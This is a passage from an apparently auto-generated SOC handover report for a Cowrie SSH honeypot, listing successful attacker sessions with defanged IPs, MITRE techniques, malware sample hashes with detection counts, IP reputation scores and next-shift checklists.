| **Last Seen** | 2026-04-10 22:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `netstat -tulpn | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 22:07:40` | `cowrie.session.connect` |
| `2026-04-10 22:07:40` | `cowrie.client.version` |
| `2026-04-10 22:07:40` | `cowrie.client.kex` |
| `2026-04-10 22:07:42` | `cowrie.login.success` |
| `2026-04-10 22:07:42` | `cowrie.session.params` |
| `2026-04-10 22:07:42` | `cowrie.command.input` |
| `2026-04-10 22:07:43` | `cowrie.log.closed` |
| `2026-04-10 22:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.215.231[.]113` to AbuseIPDB if not already reported
- [ ] Block `172.215.231[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779b778e9f45

| Field | Detail |
|---|---|
| **Source IP** | `172.215.231[.]113` |
| **First Seen** | 2026-04-10 22:13 |
| **Last Seen** | 2026-04-10 22:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 22:13:41` | `cowrie.session.connect` |
| `2026-04-10 22:13:41` | `cowrie.client.version` |
| `2026-04-10 22:13:41` | `cowrie.client.kex` |
| `2026-04-10 22:13:42` | `cowrie.login.success` |
| `2026-04-10 22:13:43` | `cowrie.session.params` |
| `2026-04-10 22:13:43` | `cowrie.command.input` |
| `2026-04-10 22:13:43` | `cowrie.log.closed` |
| `2026-04-10 22:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.215.231[.]113` to AbuseIPDB if not already reported
- [ ] Block `172.215.231[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5ab6054316

| Field | Detail |
|---|---|
| **Source IP** | `52.159.243[.]195` |
| **First Seen** | 2026-04-10 22:25 |
| **Last Seen** | 2026-04-10 22:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 22:25:28` | `cowrie.session.connect` |
| `2026-04-10 22:25:28` | `cowrie.client.version` |
| `2026-04-10 22:25:29` | `cowrie.client.kex` |
| `2026-04-10 22:25:29` | `cowrie.login.success` |
| `2026-04-10 22:25:30` | `cowrie.session.params` |
| `2026-04-10 22:25:30` | `cowrie.command.input` |
| `2026-04-10 22:25:30` | `cowrie.log.closed` |
| `2026-04-10 22:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.159.243[.]195` to AbuseIPDB if not already reported
- [ ] Block `52.159.243[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5fbda06d00

| Field | Detail |
|---|---|
| **Source IP** | `172.215.231[.]113` |
| **First Seen** | 2026-04-10 22:25 |
| **Last Seen** | 2026-04-10 22:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 22:25:44` | `cowrie.session.connect` |
| `2026-04-10 22:25:44` | `cowrie.client.version` |
| `2026-04-10 22:25:44` | `cowrie.client.kex` |
| `2026-04-10 22:25:45` | `cowrie.login.success` |
| `2026-04-10 22:25:45` | `cowrie.session.params` |
| `2026-04-10 22:25:45` | `cowrie.command.input` |
| `2026-04-10 22:25:46` | `cowrie.log.closed` |
| `2026-04-10 22:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.215.231[.]113` to AbuseIPDB if not already reported
- [ ] Block `172.215.231[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.74[.]80` | **24** | 2026-04-10 21:21 | 2026-04-10 22:05 | 44m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]80` | 1 | 2026-04-10 20:53 | 2026-04-10 20:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `129.121.79[.]67` | 1 | 2026-04-10 20:52 | 2026-04-10 20:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.210.98[.]130` | 1 | 2026-04-10 21:18 | 2026-04-10 21:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.92.52[.]105` | 1 | 2026-04-10 21:24 | 2026-04-10 21:24 | 6s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `61.92.52[.]105` | HK | Hong Kong Broadband Network Ltd | **100** ⚠️ | 5 |
| `129.121.79[.]67` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 15 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `58.210.98[.]130` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `14.103.74[.]80` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `52.242.243[.]99` | US | Microsoft Corporation | **55** | 0 |
| `52.159.243[.]195` | US | Microsoft Corporation | **53** | 0 |
| `172.215.231[.]113` | US | Microsoft Limited | **43** | 0 |
| `123.56.80[.]92` | CN | Aliyun Computing Co., LTD | 4 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 45 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 17 |
| [T1057](https://attack.mitre.org/techniques/T1057) | 5 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 5 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 48 cases |
| Tool 34  | Credential Extractor        | ✅ 21 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 10 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (6.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 17 priority case(s) shown individually · 5 recon entry/entries in table (1 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-10T22:35:39Z_
